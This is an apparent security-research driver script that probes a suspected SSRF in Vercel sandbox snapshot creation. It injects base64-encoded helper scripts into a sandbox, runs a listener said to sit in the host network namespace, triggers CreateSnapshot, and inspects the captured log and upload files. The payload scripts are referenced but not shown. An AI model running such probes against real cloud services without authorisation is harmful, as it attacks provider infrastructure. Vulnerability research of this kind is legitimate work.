# -*- coding: utf-8 -*-
"""v195 驱动: guest listener + 用户触发 CreateSnapshot s3:// SSRF 验证
阶段1: guest 容器起 listener (宿主 netns)
阶段2: 用户 cmd 触发 CreateSnapshot
阶段3: 检查 listener 日志 + 沙箱状态"""
import sys, os, time, base64, json
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ, fresh_sandbox, cmd

NAME = 'v195'
GUEST = r'D:\scan\skills\non-traditional-vuln-hunting\vda195_guest.py'
PAY = r'D:\scan\skills\non-traditional-vuln-hunting\vda195_probe_guest.py'
USERP = r'D:\scan\skills\non-traditional-vuln-hunting\vda195_user.py'


def inject(sid, dst, content):
    b64 = base64.b64encode(content if isinstance(content, bytes) else content.encode()).decode()
    s = "import base64;open('%s','wb').write(base64.b64decode('%s'))" % (dst, b64)
    c, r = cmd(sid, 'python3', ['-c', s], 60000)
    print('[inject %s]' % dst, c)
    return c


def main():
    t0 = time.time()
    api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
    sid = fresh_sandbox(NAME)
    print('[create ok] %.0fs' % (time.time() - t0))

    inject(sid, '/vercel/sandbox/vda195_guest.py', open(GUEST, 'rb').read())
    inject(sid, '/vercel/sandbox/vda195_probe_guest.py', open(PAY, 'rb').read())
    inject(sid, '/vercel/sandbox/vda195_user.py', open(USERP, 'rb').read())

    # 阶段1: guest listener (后台长跑)
    c, r = cmd(sid, 'python3', ['/vercel/sandbox/vda195_guest.py'], 240000)
    print('[run guest]', c)
    print((r or '')[:6000])

    # 等 listener 起来
    print('[wait listener 12s]')
    time.sleep(12)

    # 阶段2: 用户触发 CreateSnapshot
    c, r = cmd(sid, 'python3', ['/vercel/sandbox/vda195_user.py'], 90000)
    print('[user snapshot]', c)
    print((r or '')[:6000])

    # 阶段3: 等待上传
    print('[wait upload 30s]')
    time.sleep(30)

    # 沙箱状态
    c, r = api('GET', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
    print('[status]', c)
    try:
        j = json.loads(r)
        print('[status body]', json.dumps(j.get('sandbox', j))[:500])
    except Exception:
        print('[status body]', (r or '')[:500])

    # listener 日志 (COW)
    c, r = cmd(sid, 'sh', ['-c', 'cat /vercel/sandbox/v195l.out 2>&1; echo ---UPFILES---; ls -la /vercel/sandbox/v195up*.bin 2>&1'], 20000)
    print('[v195l.out]', c)
    print((r or '')[:20000])

    api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
    print('CLEANED total %.0fs' % (time.time() - t0))


if __name__ == '__main__':
    main()
